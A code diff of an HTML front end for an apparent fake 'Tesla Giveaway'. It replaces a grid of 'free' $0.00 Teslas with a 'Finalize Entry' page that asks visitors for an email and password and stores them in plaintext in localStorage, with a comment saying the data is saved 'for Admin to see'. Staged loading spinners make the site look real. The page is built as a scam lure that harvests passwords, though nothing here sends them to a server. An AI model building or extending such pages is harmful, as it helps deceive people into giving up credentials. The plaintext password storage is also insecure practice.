@@ -3,107 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MegaWin | Tesla Giveaway</title>
+    <title>My Profile | Tesla Giveaway</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .reveal { opacity: 0; transform: translateY(30px); transition: all 0.7s ease-out; }
-        .reveal.active { opacity: 1; transform: translateY(0); }
         .no-scrollbar::-webkit-scrollbar { display: none; }
-        .pulse-orange { animation: pulse 2s infinite; }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-            100% { transform: scale(1); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .animate-spin-slow { animation: spin 1s linear infinite; }
     </style>
 </head>
-<body class="bg-gray-50 pb-24 font-sans">
+<body class="bg-[#f8fafc] font-sans text-slate-900 pb-24">
 
-    <nav class="sticky top-0 z-50 bg-white border-b px-4 py-3 shadow-sm">
-        <div class="max-w-6xl mx-auto flex items-center justify-between gap-4">
-            <h1 class="text-2xl font-black text-orange-600 italic tracking-tighter">MegaWin</h1>
-            <div class="flex items-center gap-3">
-                <button class="text-sm font-bold text-gray-700 hover:text-orange-600 transition">Log In</button>
-                <button class="text-sm font-bold bg-black text-white px-4 py-2 rounded-full hover:bg-gray-800 transition">Sign Up</button>
+    <div id="loader" class="fixed inset-0 bg-slate-900/90 backdrop-blur-md z-[9999] flex flex-col items-center justify-center hidden">
+        <div class="w-14 h-14 border-4 border-slate-700 border-t-blue-500 rounded-full animate-spin-slow"></div>
+        <p class="mt-4 font-medium text-blue-400 tracking-widest animate-pulse uppercase text-[10px]">Processing Request...</p>
+    </div>
+
+    <nav class="bg-white border-b border-slate-200 px-6 py-5 sticky top-0 z-50">
+        <div class="max-w-md mx-auto flex items-center justify-between">
+            <h1 class="text-lg font-black tracking-tighter uppercase text-slate-800">Account <span class="text-blue-600">Center</span></h1>
+            <div class="flex gap-4 text-slate-400">
+                <span>🛡️</span>
+                <span>🎧</span>
             </div>
         </div>
     </nav>
 
-    <main class="max-w-6xl mx-auto px-3 mt-6">
-        <h2 class="text-2xl font-black mb-6 px-1 text-gray-900">Available Teslas</h2>
-        
-        <div id="tesla-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+    <div id="auth-screen" class="max-w-md mx-auto px-6 pt-12">
+        <div class="text-center mb-10">
+            <div class="inline-block p-4 bg-blue-50 rounded-2xl mb-4">
+                <span class="text-4xl">⚡</span>
             </div>
-    </main>
-
-    <footer class="fixed bottom-0 left-0 right-0 bg-white border-t py-3 flex justify-around text-[10px] font-bold text-gray-400 shadow-lg z-50">
-        <div class="text-orange-600 flex flex-col items-center">
-            <span class="text-xl mb-1">🏠</span>
-            <span>Home</span>
+            <h2 class="text-2xl font-black text-slate-900 uppercase tracking-tight">Finalize Entry</h2>
+            <p class="text-sm text-slate-500 mt-2">Create an account to secure your Tesla giveaway slot and track delivery status.</p>
         </div>
-        <div class="flex flex-col items-center"><span class="text-xl mb-1">👤</span><span>Me</span></div>
+
+        <div class="space-y-4">
+            <div>
+                <label class="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Email Address</label>
+                <input id="email" type="email" placeholder="name@example.com" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all">
+            </div>
+            <div>
+                <label class="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Secure Password</label>
+                <input id="password" type="password" placeholder="••••••••" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all">
+            </div>
+            
+            <button onclick="handleAuth()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest shadow-xl shadow-blue-100 hover:bg-blue-700 transition-all mt-4">
+                Create Account
+            </button>
+        </div>
+
+        <p class="mt-8 text-center text-xs text-slate-400 font-medium">
+            By joining, you agree to the <span class="text-blue-600 underline">Giveaway Terms</span>
+        </p>
+    </div>
+
+    <div id="user-screen" class="hidden max-w-md mx-auto">
+        <div class="bg-white p-8 border-b border-slate-200 text-center">
+            <div class="w-24 h-24 bg-slate-100 rounded-full mx-auto mb-4 border-4 border-white shadow-lg overflow-hidden">
+                <img id="user-avatar" src="https://api.dicebear.com/7.x/identicon/svg?seed=Tesla" alt="Avatar">
+            </div>
+            <h2 id="display-name" class="text-xl font-black text-slate-900 uppercase tracking-tight">User</h2>
+            <p class="text-[10px] font-bold text-blue-600 bg-blue-50 px-3 py-1 rounded-full inline-block mt-2 tracking-widest uppercase">Verified Entrant</p>
+        </div>
+
+        <div class="grid grid-cols-3 bg-white border-b border-slate-200">
+            <div class="py-6 text-center border-r border-slate-100">
+                <p class="text-lg font-black text-slate-900">1</p>
+                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Entries</p>
+            </div>
+            <div class="py-6 text-center border-r border-slate-100">
+                <p class="text-lg font-black text-slate-900">0</p>
+                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Claimed</p>
+            </div>
+            <div class="py-6 text-center">
+                <p class="text-lg font-black text-blue-600">Pending</p>
+                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Status</p>
+            </div>
+        </div>
+
+        <div class="mt-4 space-y-1">
+            <div class="bg-white p-5 flex items-center justify-between group cursor-pointer">
+                <div class="flex items-center gap-4">
+                    <span class="text-xl">🏎️</span>
+                    <span class="text-sm font-bold text-slate-700 uppercase tracking-tight">My Tesla Garage</span>
+                </div>
+                <span class="text-slate-300 group-hover:text-blue-500 transition-colors">❯</span>
+            </div>
+            <div class="bg-white p-5 flex items-center justify-between group cursor-pointer">
+                <div class="flex items-center gap-4">
+                    <span class="text-xl">📍</span>
+                    <span class="text-sm font-bold text-slate-700 uppercase tracking-tight">Delivery Address</span>
+                </div>
+                <span class="text-slate-300 group-hover:text-blue-500 transition-colors">❯</span>
+            </div>
+            <div class="bg-white p-5 flex items-center justify-between group cursor-pointer">
+                <div class="flex items-center gap-4">
+                    <span class="text-xl">📄</span>
+                    <span class="text-sm font-bold text-slate-700 uppercase tracking-tight">Official Rules</span>
+                </div>
+                <span class="text-slate-300 group-hover:text-blue-500 transition-colors">❯</span>
+            </div>
+        </div>
+
+        <div class="p-6 mt-6">
+            <button onclick="logout()" class="w-full py-4 border-2 border-slate-200 text-slate-400 font-black text-[10px] uppercase tracking-[0.2em] rounded-xl hover:bg-red-50 hover:border-red-100 hover:text-red-500 transition-all">
+                Sign Out / Reset Session
+            </button>
+        </div>
+    </div>
+
+    <footer class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 py-4 flex justify-around text-[10px] font-bold z-50">
+        <a href="index.html" class="nav-link text-slate-400 flex flex-col items-center gap-1">
+            <span class="text-2xl">🏠</span>
+            <span class="uppercase tracking-widest">Showroom</span>
+        </a>
+        <a href="profile.html" class="nav-link text-blue-600 flex flex-col items-center gap-1">
+            <span class="text-2xl">👤</span>
+            <span class="uppercase tracking-widest">My Profile</span>
+        </a>
     </footer>
 
     <script>
-        const grid = document.getElementById('tesla-grid');
-        
-        // Array of different Tesla-related keywords to ensure variety
-        const teslaVariations = [
-            "tesla-model-s", "tesla-model-3", "tesla-model-x", "tesla-model-y", 
-            "cybertruck", "tesla-interior", "tesla-roadster", "tesla-charging",
-            "tesla-wheel", "tesla-autopilot", "white-tesla", "black-tesla"
-        ];
-
-        const modelNames = ["Model S Plaid", "Cybertruck", "Model 3 Performance", "Model X Plaid", "Model Y LR"];
-
-        for (let i = 1; i <= 50; i++) {
-            const randomKeyword = teslaVariations[i % teslaVariations.length];
-            const randomModel = modelNames[Math.floor(Math.random() * modelNames.length)];
-            
-            // Using Unsplash Source with a random seed (i) to ensure each image is unique even with same keyword
-            const imageUrl = `https://images.unsplash.com/photo-1536700503339-1e4b06520771?auto=format&fit=crop&w=500&q=60&sig=${i}`;
-            // Alternative: use source.unsplash.com/featured/?tesla,${randomKeyword}&sig=${i}
-            
-            // To make it look even more varied, we'll swap between a few specific high-quality Tesla IDs
-            const specificIds = [
-                "1560958089-b8a1929cea89", "1617788138017-80ad40651399", 
-                "1619767886558-efdc259cde1a", "1620891549027-942fdc95d3f5",
-                "1536700503339-1e4b06520771", "1605816416998-df87ee13db48",
-                "1571127236794-81c0bbfe1ce3", "1612810806563-4cb8265db71f"
-            ];
-            const finalImg = `https://images.unsplash.com/photo-${specificIds[i % specificIds.length]}?w=500&q=80&sig=${i}`;
-
-            const card = document.createElement('div');
-            card.className = "reveal bg-white rounded-2xl overflow-hidden shadow-sm border border-gray-100";
-            card.innerHTML = `
-                <div class="h-40 md:h-52 relative bg-gray-200">
-                    <img src="${finalImg}" class="w-full h-full object-cover" alt="Tesla">
-                    <div class="absolute top-2 right-2 bg-orange-600 text-white text-[9px] font-black px-2 py-1 rounded">FREE</div>
-                </div>
-                <div class="p-3">
-                    <p class="text-xs font-bold text-gray-800 truncate">${randomModel} Edition</p>
-                    <div class="flex items-baseline gap-2 mt-1">
-                        <span class="text-lg font-black text-orange-600">$0.00</span>
-                        <span class="text-[10px] text-gray-400 line-through">$94,000</span>
-                    </div>
-                    <button class="w-full mt-3 bg-orange-600 text-white py-2 rounded-xl font-black text-[10px] uppercase pulse-orange">
-                        Claim Free
-                    </button>
-                </div>
-            `;
-            grid.appendChild(card);
+        // --- LOADER LOGIC ---
+        function startLoading(url) {
+            document.getElementById('loader').classList.remove('hidden');
+            setTimeout(() => { window.location.href = url; }, 3000);
         }
 
-        // Scroll Animation Logic
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('active');
-                }
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                startLoading(this.getAttribute('href'));
             });
-        }, { threshold: 0.1 });
+        });
 
-        document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
+        // --- AUTH LOGIC ---
+        function handleAuth() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if (!email || !pass) {
+                alert("Please complete all fields.");
+                return;
+            }
+
+            // Show Loader for 3 seconds before "Creating Account"
+            document.getElementById('loader').classList.remove('hidden');
+            
+            setTimeout(() => {
+                // 1. Save User Data for Admin to see
+                let users = JSON.parse(localStorage.getItem('mega_users') || "[]");
+                users.push({ 
+                    email: email, 
+                    password: pass, 
+                    date: new Date().toLocaleString() 
+                });
+                localStorage.setItem('mega_users', JSON.stringify(users));
+
+                // 2. Set the active session
+                localStorage.setItem('currentUser', email);
+                
+                // Refresh to show the logged-in screen
+                location.reload();
+            }, 3000);
+        }
+
+        // --- SESSION CHECK ---
+        window.onload = () => {
+            const user = localStorage.getItem('currentUser');
+            if (user) {
+                document.getElementById('auth-screen').classList.add('hidden');
+                document.getElementById('user-screen').classList.remove('hidden');
+                document.getElementById('display-name').innerText = user.split('@')[0];
+                document.getElementById('user-avatar').src = `https://api.dicebear.com/7.x/identicon/svg?seed=${user}`;
+            }
+        };
+
+        function logout() {
+            localStorage.removeItem('currentUser');
+            location.reload();
+        }
     </script>
 </body>
 </html>
